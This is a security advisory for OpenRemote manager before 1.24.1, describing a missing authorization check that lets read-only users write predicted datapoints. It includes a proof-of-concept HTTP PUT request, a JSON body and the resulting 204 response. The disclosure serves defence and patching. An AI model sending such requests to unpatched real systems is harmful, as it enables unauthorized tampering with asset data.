# [M] OpenRemote read-only asset users can write predicted datapoints

## Summary
Severity: Medium
Advisory: GHSA-xj53-j257-hxvg
CVE: CVE-2026-49439
CWE: CWE-862
Ecosystem: Maven
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:N (CVSS_V3)
Published: 2026-07-06
Source: https://github.com/advisories/GHSA-xj53-j257-hxvg
Type: github-advisory

## Affected
- Maven: `io.openremote:openremote-manager` — affected >=0 <1.24.1

## Details
# Summary

The predicted datapoint write endpoint allows users with only `read:assets` privileges to write predicted datapoints.

The endpoint:

```text
PUT /api/{realm}/asset/predicted/{assetId}/{attributeName}
```

accepts write requests from users lacking `write:assets`.

The implementation appears to check `READ_ASSETS` while performing a write operation through:

```java
assetPredictedDatapointService.updateValues(...)
```

# PoC

A user was created with only:

```text
read:assets
```

and without `write:assets`.

The following request succeeded:

```http
PUT /api/master/asset/predicted/4Fr8Pcp7iDjrEmoSUFolvT/temperature
```

Request body:

```json
[{"x":1779199999001,"y":1337}]
```

Response:

```text
HTTP/2 204
```

Database verification confirmed the datapoint was written successfully:

```text
entity_id: 4Fr8Pcp7iDjrEmoSUFolvT
attribute_name: temperature
value: 1337
```

# Impact

Users with read-only asset permissions can modify predicted datapoints for assets.

## References
- https://github.com/openremote/openremote/security/advisories/GHSA-xj53-j257-hxvg
- https://github.com/openremote/openremote/commit/583dbbfb96076ba099be8729ddf506acf9e48325
- https://github.com/openremote/openremote
